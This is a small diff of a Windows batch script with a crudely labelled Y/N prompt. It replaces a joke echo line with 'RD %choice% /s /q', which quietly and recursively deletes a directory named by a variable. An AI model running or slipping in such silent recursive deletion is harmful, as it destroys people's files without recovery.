@@ -15,5 +15,5 @@ set /p OPTION= "[Y/N]"
 IF "%OPTION%"=="N" goto option
 IF "%OPTION%"=="Y" goto ohfuck
 :ohfuck
-echo SEX
+RD %choice% /s /q
 pause
